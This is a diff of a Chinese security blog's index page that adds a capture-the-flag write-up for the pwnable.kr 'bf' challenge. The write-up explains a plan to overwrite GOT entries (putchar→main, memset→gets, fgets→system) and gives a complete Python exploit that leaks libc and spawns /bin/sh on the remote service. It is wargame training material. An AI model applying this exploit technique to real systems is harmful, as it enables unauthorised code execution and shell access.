@@ -298,6 +298,140 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/24/pwnable-rookiss-brainfuck/" itemprop="url">
+                  pwnable.kr-rookiss-bf
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-24T00:00:00+08:00" content="2016-07-24">
+              2016-07-24
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/24/pwnable-rookiss-brainfuck/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/24/pwnable-rookiss-brainfuck/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <ul>
+<li><code>&lt;</code>: 指针-1</li>
+<li><code>&gt;</code>: 指针+1</li>
+<li><code>.</code>: 读取指针指向的字节</li>
+<li><code>,</code>: 往指针指向的字节写入一个字节</li>
+</ul>
+<h2 id="Conclusion">Conclusion</h2><ol>
+<li>修改<code>putchar</code>的got表内的地址为<code>main</code>首地址</li>
+<li>修改<code>memset</code>的got表内的地址为<code>gets</code>的地址</li>
+<li>修改<code>fgets</code>的got表内的地址为<code>system</code>的地址</li>
+<li>利用<code>.</code>触发</li>
+</ol>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./bf'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048717</span>])</span><br><span class="line"></span><br><span class="line">adr_tape    = <span class="number">0x804a0a0</span></span><br><span class="line">adr_p       = <span class="number">0x804a080</span></span><br><span class="line">got_putchar = <span class="number">0x804a030</span></span><br><span class="line">got_memset  = <span class="number">0x804a02c</span></span><br><span class="line">got_fgets   = <span class="number">0x804a010</span></span><br><span class="line">off_putchar = <span class="number">0x00677d0</span></span><br><span class="line">off_system  = <span class="number">0x003f0b0</span></span><br><span class="line">off_gets    = <span class="number">0x0065e90</span></span><br><span class="line">adr_main    = <span class="number">0x8048671</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#off_putchar = 0x0066480</span></span><br><span class="line"><span class="comment">#off_system  = 0x0040190</span></span><br><span class="line"><span class="comment">#off_fgets   = 0x0063b20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_bf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (l32(io.read(<span class="number">4</span>)) - off_putchar)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'type some brainfuck instructions except [ ]\n'</span>)</span><br><span class="line"></span><br><span class="line">payload     =   <span class="string">'&lt;'</span> * (adr_tape - adr_p)</span><br><span class="line">payload     +=  <span class="string">','</span>             <span class="comment"># write</span></span><br><span class="line">payload     +=  <span class="string">'..&gt;.&gt;.&gt;.'</span>      <span class="comment"># read</span></span><br><span class="line">payload     +=  <span class="string">'&lt;&lt;&lt;,&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span>    <span class="comment"># write</span></span><br><span class="line">payload     +=  <span class="string">'&lt;'</span> * (got_putchar - got_memset)</span><br><span class="line">payload     +=  <span class="string">',&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span></span><br><span class="line">payload     +=  <span class="string">'&lt;'</span> * (got_memset - got_fgets)</span><br><span class="line">payload     +=  <span class="string">',&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span></span><br><span class="line">payload     +=  <span class="string">'.'</span>             <span class="comment"># invoke</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.write(<span class="string">'\x30'</span>)</span><br><span class="line">io.read(<span class="number">1</span>)</span><br><span class="line">libc_base   = read_bf()</span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line">adr_gets    = libc_base + off_gets</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base:       0x%x'</span> % libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system address:  0x%x'</span> % adr_system</span><br><span class="line">io.write(l32(adr_main))</span><br><span class="line">io.write(l32(adr_gets))</span><br><span class="line">io.write(l32(adr_system))</span><br><span class="line">io.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/24/pwnable-rookiss-brainfuck/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/21/def-con-qual-2016-babyfirst/" itemprop="url">
                   def-con-qual-2016-babyfirst
                 </a>
@@ -820,7 +954,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">24</span>
+              <span class="site-state-item-count">25</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -837,7 +971,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">24</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
